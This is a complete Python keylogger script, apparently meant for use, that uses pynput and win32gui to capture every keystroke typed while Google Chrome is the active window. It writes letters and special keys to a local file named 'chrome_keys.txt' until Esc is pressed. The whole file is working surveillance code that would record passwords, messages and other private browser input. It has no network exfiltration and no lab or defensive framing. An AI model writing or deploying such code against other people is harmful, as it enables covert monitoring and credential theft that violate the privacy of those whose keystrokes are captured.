from pynput import keyboard
import win32gui
import sys

# --- Configuration ---
TARGET_WINDOW_CLASS = "Chrome_WidgetWin_1"
LOG_FILE = "chrome_keys.txt"

def get_active_window_class():
    """Gets the class name of the currently active window."""
    try:
        hwnd = win32gui.GetForegroundWindow()
        return win32gui.GetClassName(hwnd)
    except Exception:
        return None

def on_press(key):
    """Callback function that is executed when a key is pressed."""
    # Check if the active window is our target (Chrome)
    if get_active_window_class() == TARGET_WINDOW_CLASS:
        try:
            # Try to format the key as a character (for letters, numbers, etc.)
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(key.char)
        except AttributeError:
            # If it's a special key (like Shift, Ctrl, Enter), it has no 'char' attribute.
            # We'll log its string representation instead.
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"[{str(key)}]")

def main():
    """Sets up the listener and starts the keylogger."""
    print(f"Starting keylogger for Google Chrome using pynput.")
    print(f"Keystrokes will be logged to: {LOG_FILE}")
    print("Press Esc in Chrome to stop the logger.")

    # Create a listener instance
    with keyboard.Listener(on_press=on_press) as listener:
        # The listener will run until the 'on_press' function returns False,
        # or until we stop it manually.
        # We can stop it by checking for the 'Esc' key.
        def on_esc(key):
            if key == keyboard.Key.esc:
                print("Esc key pressed. Stopping logger.")
                return False # Returning False stops the listener
        
        # Start a second listener just for the escape key to stop the program
        with keyboard.Listener(on_press=on_esc) as esc_listener:
            esc_listener.join()
        
        listener.stop()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nKeylogger stopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")
        print("Make sure you have 'pywin32' installed for win32gui, even if you use pynput for hooking.")
        print("Run: pip install pywin32")
